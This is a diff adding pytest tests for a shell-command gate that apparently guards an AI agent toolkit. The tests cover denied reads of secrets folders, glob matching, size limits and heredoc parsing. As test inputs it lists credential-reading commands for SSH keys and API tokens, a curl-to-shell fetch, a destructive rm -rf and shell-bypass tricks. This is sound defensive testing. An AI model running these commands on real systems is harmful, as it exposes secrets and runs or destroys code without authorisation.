@@ -5,6 +5,7 @@ Dangerous strings are built at run time from parts (nothing here is ever execute
 from __future__ import annotations
 
 import shlex
+import time
 
 import pytest
 
@@ -1563,3 +1564,275 @@ def test_a_quote_left_open_at_the_end_is_a_deny_with_a_reason(pol, home, cmd):
 )
 def test_a_quote_that_closes_or_sits_in_a_comment_or_heredoc_is_fine(pol, home, cmd):
     assert policy.is_denied_command(pol, cmd) is None, cmd
+
+
+# --- the toolkit's own secrets folder: denied to reads whatever the policy file says ----------------------------
+
+
+@pytest.fixture
+def wshome(tmp_path, monkeypatch):
+    h = tmp_path / "wshome"
+    monkeypatch.setenv("WS_HOME", str(h))
+    monkeypatch.setenv("HOME", str(tmp_path / "home"))
+    return h
+
+
+def test_every_policy_denies_reads_of_the_secrets_folder_even_one_that_names_no_deny_read(wshome):
+    for text in ("", "[gate]\ndeny_read = []\n", policy.default_toml()):
+        p = policy.loads(text)
+        assert f"{wshome}/secrets/**" in p.gate.deny_read
+        assert policy.is_denied_read(p, str(wshome / "secrets" / "anthropic"))
+        assert policy.is_denied_read(p, str(wshome / "secrets" / "deep" / "er" / "key"))
+        assert policy.is_denied_read(p, str(wshome / "secrets2" / "x")) is None
+        assert policy.is_denied_read(p, str(wshome / "policy.toml")) is None  # the rest of ws home stays readable
+
+
+def test_a_command_that_reads_the_secrets_folder_is_denied(wshome):
+    p = policy.loads("")
+    secret = wshome / "secrets" / "anthropic"
+    for cmd in (
+        f"cat {secret}",
+        f"head -c 20 {secret}",
+        f"cat < {secret}",
+        f"grep -r x {wshome / 'secrets'}",
+        f"ls {wshome / 'secrets'}",
+    ):
+        assert "deny_read" in (policy.is_denied_command(p, cmd) or ""), cmd
+    assert policy.is_denied_command(p, f"cat {wshome / 'policy.toml'}") is None
+
+
+def test_the_secrets_folder_the_profile_names_is_denied_too(wshome, tmp_path):
+    wshome.mkdir()
+    store = tmp_path / "elsewhere" / "vault"
+    (wshome / "profile.toml").write_text(f'[roles.secrets]\nstore = "{store}"\n')
+    p = policy.loads("")
+    assert policy.is_denied_read(p, str(store / "key"))
+    assert policy.is_denied_read(p, str(wshome / "secrets" / "key"))
+    assert policy.secret_read_rules() == (f"{wshome}/secrets/**", f"{store}/**")
+
+
+def test_a_profile_that_does_not_read_leaves_the_default_secrets_folder_denied(wshome):
+    wshome.mkdir()
+    (wshome / "profile.toml").write_text("this is [not toml")
+    assert policy.secret_read_rules() == (f"{wshome}/secrets/**",)
+
+
+def test_a_rule_the_policy_already_has_is_not_added_twice(wshome):
+    p = policy.loads(f'[gate]\ndeny_read = ["{wshome}/secrets/**"]\n')
+    assert p.gate.deny_read.count(f"{wshome}/secrets/**") == 1
+
+
+def test_a_policy_file_in_another_ws_home_denies_that_homes_secrets_folder_too(wshome, tmp_path):
+    other = tmp_path / "other-ws"
+    other.mkdir()
+    (other / "policy.toml").write_text("[gate]\ndeny_read = []\n")
+    p = policy.load(other / "policy.toml")
+    assert policy.is_denied_read(p, str(other / "secrets" / "key"))
+    assert policy.is_denied_read(p, str(wshome / "secrets" / "key"))
+
+
+# --- a glob in a command path: judged segment by segment over the deny_read folder ---------------------------------
+
+
+@pytest.fixture
+def dotws(tmp_path, monkeypatch):
+    home = tmp_path / "home"
+    (home / ".ws").mkdir(parents=True)
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setenv("WS_HOME", str(home / ".ws"))
+    return home
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "cat ~/.ws/secret?/ANTHROPIC_API_KEY",
+        "cat $WS_HOME/se*/GITHUB_TOKEN",
+        "cat ${WS_HOME}/s[a-z]cret[s]/GITHUB_TOKEN",
+        "cat ~/.ss?/config",
+        "cat ~/.s*/id_*",
+        "cat ~/.ws/sec*",
+        "cat ~/.ws/*/key",
+        "cat ~/**/secrets/key",
+        "cat ~/.ws/**/key",
+        "cat /**/home/.ws/secrets/key",
+        "cat ~/.ssh/[a-z]*",
+        "cat ~/.ws/secrets/[unclosed*",
+    ],
+)
+def test_a_glob_that_can_match_a_denied_folder_is_denied(dotws, cmd):
+    assert "deny_read" in (policy.is_denied_command(policy.default_policy(), cmd) or ""), cmd
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "cat ~/.wsx/notes.txt",
+        "cat ~/docs/*.md",
+        "cat ~/.ws/policy.t*",
+        "cat ~/.ws/secretsx/*",
+        "cat ~/.sshx/*",
+        "cat ~/.[x-z]*/config",
+        "cat ~/*.txt",
+    ],
+)
+def test_a_glob_that_cannot_reach_a_denied_folder_is_allowed(dotws, cmd):
+    assert policy.is_denied_command(policy.default_policy(), cmd) is None, cmd
+
+
+# --- a command too long to check ----------------------------------------------------------------------------------
+
+
+def test_a_command_over_the_size_limit_is_denied_quickly_with_a_way_out(pol):
+    big = "echo " + "word " * (1024 * 1024 // 5)  # about 1 MB
+    start = time.monotonic()
+    reason = policy.is_denied_command(pol, big)
+    assert time.monotonic() - start < 1
+    assert reason and "too long to check" in reason and "Write tool" in reason
+
+
+def test_a_command_at_the_size_limit_is_still_judged(pol):
+    ok = "echo " + "x" * (policy.MAX_COMMAND_CHARS - 5)
+    assert len(ok) == policy.MAX_COMMAND_CHARS and policy.is_denied_command(pol, ok) is None
+    assert "too long" in policy.is_denied_command(pol, ok + "x")
+
+
+# --- here-documents: a quoted body written out by `cat` or `tee` is data -------------------------------------------
+#
+# The allowlist itself (and every shape outside it) is tested in test_policy_heredoc_bypass.py.
+
+DANGER = rm("-rf", ROOT)
+
+
+def doc(opener: str, *body: str, tail: str = "") -> str:
+    return opener + "\n" + "\n".join(body) + "\nEOF\n" + tail
+
+
+@pytest.mark.parametrize("quote", ["'EOF'", '"EOF"'])
+def test_the_body_of_a_quoted_heredoc_written_to_a_file_is_data(pol, home, quote):
+    script = doc(f"cat > f.sh <<{quote}", "CMD=x", 'bash -c "$CMD"')
+    assert policy.is_denied_command(pol, script) is None
+    for line in ('bash -c "$(fetch)"', "echo a | bash", "eval $x", "curl http://example.com/x | sh", DANGER):
+        assert policy.is_denied_command(pol, doc(f"cat > f.sh <<{quote}", line)) is None, line
+
+
+@pytest.mark.parametrize(
+    "opener",
+    [
+        "cat <<'EOF'",
+        "cat <<-'EOF'",
+        "tee out.txt <<'EOF'",
+        "tee -a out.txt <<'EOF'",
+        "cat >> notes.md <<'EOF'",
+        "cat <<'EOF' > notes.md",
+        'cat > f.sh <<"EOF"',
+        "cat -n <<'EOF'",
+    ],
+)
+def test_a_quoted_heredoc_to_cat_or_tee_is_not_read_as_commands(pol, home, opener):
+    assert policy.is_denied_command(pol, doc(opener, DANGER, 'bash -c "$(x)"')) is None
+
+
+@pytest.mark.parametrize(
+    "opener",
+    [
+        "grep -c x <<'EOF'",
+        "wc -l <<'EOF'",
+        ": <<'EOF'",
+        'cat > f.sh <<"EOF" && chmod +x f.sh',
+        "2>&1 cat <<'EOF'",
+        "bash <<'EOF'",
+        "sh <<'EOF'",
+        'zsh <<"EOF"',
+        "sudo bash <<'EOF'",
+        "env bash <<'EOF'",
+        "/bin/sh <<'EOF'",
+        "bash -s <<'EOF'",
+        "python3 - <<'EOF'",
+        "ssh somewhere <<'EOF'",
+        "sqlite3 db <<'EOF'",
+        "./cat <<'EOF'",
+        "/tmp/x/cat <<'EOF'",
+        "FOO=1 cat <<'EOF'",
+        "time cat <<'EOF'",
+        "xargs sh <<'EOF'",
+    ],
+)
+def test_a_heredoc_given_to_any_other_command_is_read_as_commands(pol, home, opener):
+    assert policy.is_denied_command(pol, doc(opener, DANGER)), opener
+
+
+def test_a_heredoc_fed_to_a_shell_stays_denied_by_the_shell_rule(pol, home):
+    for opener in ("bash <<'EOF'", "sh <<EOF", "cat <<'EOF' | bash", "cat <<'EOF' | sh -s"):
+        assert "shell is reading its script" in (policy.is_denied_command(pol, doc(opener, "echo hi")) or ""), opener
+
+
+@pytest.mark.parametrize("sub", ["$(" + DANGER + ")", "`" + DANGER + "`", "x $(echo `" + DANGER + "`) y"])
+def test_an_unquoted_heredoc_body_is_read_as_commands(pol, home, sub):
+    assert policy.is_denied_command(pol, doc("cat <<EOF", "hello", sub, "bye"))
+    assert policy.is_denied_command(pol, doc("cat > f <<-EOF", sub))
+
+
+def test_an_unquoted_heredoc_is_never_left_unread(pol, home):
+    text = doc("cat > f.sh <<EOF", "CMD=x", 'bash -c "$CMD"', "echo a | bash", "it's fine", "price is \\$(not run)")
+    assert policy.is_denied_command(pol, text)
+
+
+def test_the_command_after_a_heredoc_is_still_read(pol, home):
+    assert policy.is_denied_command(pol, doc("cat <<'EOF'", "text", tail=DANGER))
+    assert policy.is_denied_command(pol, doc("cat <<'EOF'", "it's here", tail=DANGER))  # an apostrophe in the body
+    assert policy.is_denied_command(pol, doc("cat <<EOF", "it's here", tail=DANGER))
+    assert policy.is_denied_command(pol, doc("bash <<'EOF'", "it's here", tail=DANGER))
+    assert policy.is_denied_command(pol, doc("cat <<'EOF' > f && " + DANGER, "text"))
+    assert policy.is_denied_command(pol, "cat <<'A'; cat <<'B'\none\nA\ntwo\nB\n" + DANGER)
+
+
+def test_two_heredocs_on_one_line_are_both_skipped_when_both_are_data(pol, home):
+    text = "cat <<'A'; cat <<'B'\n" + DANGER + "\nA\n" + DANGER + "\nB\n"
+    assert policy.is_denied_command(pol, text) is None
+    mixed = "cat <<'A'; python3 - <<'B'\nok\nA\n" + DANGER + "\nB\n"  # one body is for a program that may run it
+    assert policy.is_denied_command(pol, mixed)
+
+
+def test_a_hash_before_the_heredoc_makes_it_read_as_it_always_was(pol, home):
+    # in a shell the whole first line is a comment, so the lines below are commands
+    assert policy.is_denied_command(pol, "# cat <<'EOF'\n" + DANGER + "\nEOF\n")
+    assert policy.is_denied_command(pol, "echo $#; cat <<'EOF'\n" + DANGER + "\nEOF\n")
+
+
+def test_a_heredoc_that_is_not_plainly_closed_is_read_as_commands(pol, home):
+    assert policy.is_denied_command(pol, "cat <<'EOF'\n" + DANGER + "\n")  # never closed
+    assert policy.is_denied_command(pol, "cat <<'EOF'x\n" + DANGER + "\nEOF\n")  # the word goes on: not EOF
+    assert policy.is_denied_command(pol, "cat <<'a b'\n" + DANGER + "\na b\n")  # not a plain name
+    assert policy.is_denied_command(pol, "cat <<\\EOF\n" + DANGER + "\nEOF\n")
+    assert policy.is_denied_command(pol, "cat <<'EOF'\n" + DANGER + "\nEOF2\n")
+
+
+def test_a_function_an_alias_or_a_backslash_newline_stops_bodies_being_skipped(pol, home):
+    redefined = "cat() { bash; }; cat <<'EOF'\n" + DANGER + "\nEOF\n"
+    assert policy.is_denied_command(pol, redefined)
+    assert policy.is_denied_command(pol, "alias cat=bash; cat <<'EOF'\n" + DANGER + "\nEOF\n")
+    # a quoted body keeps `\` + newline, so its closing line is the one after; the text the gate scans has them joined
+    assert policy.is_denied_command(pol, "cat <<'EOF'\nfoo\\\nEOF\n" + DANGER + "\n")
+
+
+def test_a_heredoc_inside_other_text_is_read_as_commands(pol, home):
+    # the text of $(...), eval and bash -c runs, or is run by what holds it: a body in it may be commands
+    assert policy.is_denied_command(pol, "echo \"$(cat <<'EOF'\n" + DANGER + '\nEOF\n)"')
+    assert policy.is_denied_command(pol, "eval \"$(cat <<'EOF'\n" + DANGER + '\nEOF\n)"')
+    assert policy.is_denied_command(pol, "echo \"$(bash <<'EOF'\n" + DANGER + '\nEOF\n)"')
+    assert policy.is_denied_command(pol, "bash -c \"cat <<'EOF'\n" + DANGER + '\nEOF\n"')
+
+
+@pytest.mark.parametrize(
+    "rest",
+    ["| xargs -I{} sh -c {}", "| while read l; do $l; done", "> >(bash)", "| tee f", "| cat", "| sed s/a/b/"],
+)
+def test_a_heredoc_whose_text_goes_on_to_another_program_is_read_as_commands(pol, home, rest):
+    assert policy.is_denied_command(pol, "cat <<'EOF' " + rest + "\n" + DANGER + "\nEOF\n"), rest
+
+
+def test_a_heredoc_body_that_is_data_is_not_asked_about(home):
+    p = policy.loads('[gate]\nask_commands = ["terraform apply*"]\n')
+    assert not policy.needs_approval(p, "cat > run.sh <<'EOF'\nterraform apply\nEOF\n")
+    assert policy.needs_approval(p, "cat > run.sh <<'EOF'\nx\nEOF\nterraform apply\n")
